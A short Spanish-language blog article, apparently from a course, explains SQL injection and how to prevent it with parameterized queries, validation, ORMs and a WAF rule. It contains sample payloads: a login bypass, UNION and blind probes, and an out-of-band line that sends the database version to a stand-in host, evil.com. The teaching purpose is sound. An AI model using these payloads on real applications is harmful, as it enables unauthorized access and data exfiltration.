---
title: "SQL Injection: el ataque más común explicado"
description: "Qué es, cómo funciona y cómo proteger tus aplicaciones"
---

# SQL Injection: el ataque más común explicado

## ¿Qué es SQL Injection?

SQL Injection es un ataque donde un atacante **inyecta código SQL malicioso** en campos de entrada para manipular la base de datos.

## Ejemplo simple

**Login normal:**
```sql
SELECT * FROM users WHERE username='admin' AND password='pass123';
```

**Con SQL Injection:**
```
Usuario: admin' OR '1'='1
Password: cualquier cosa
```

**Resultado:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='cualquier cosa';
-- '1'='1' SIEMPRE es true → Acceso concedido
```

## Tipos de SQL Injection

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| **In-band** | Resultado visible | `' UNION SELECT null,table_name FROM information_schema.tables--` |
| **Blind** | Sin resultado visible | `' AND 1=1--` (true) vs `' AND 1=2--` (false) |
| **Out-of-band** | Vía DNS/HTTP | `LOAD_FILE(CONCAT('\\\\',version(),'.evil.com\\file'))` |

## Prevención

### 1. Prepared Statements (_parameterized queries_)
```python
# MAL ❌
cursor.execute(f"SELECT * FROM users WHERE id={user_id}")

# BIEN ✅
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))
```

### 2. Input Validation
```python
# Validar que el input sea solo numérico
if not user_id.isdigit():
    return "Invalid input"
```

### 3. ORM (Object-Relational Mapping)
```python
# Django ORM - automáticamente parameteriza
User.objects.filter(id=user_id)
```

### 4. WAF (Web Application Firewall)
```
# ModSecurity规则
SecRule ARGS "@detectSQLi" "id:1,deny,status:403"
```

## Herramientas para detectar

- **sqlmap** — Automatiza SQL injection
- **Burp Suite** — Proxy para testing manual
- **OWASP ZAP** — Scanner gratuito

---

*Artículo publicado en el Blog CDPN — Semana 4*
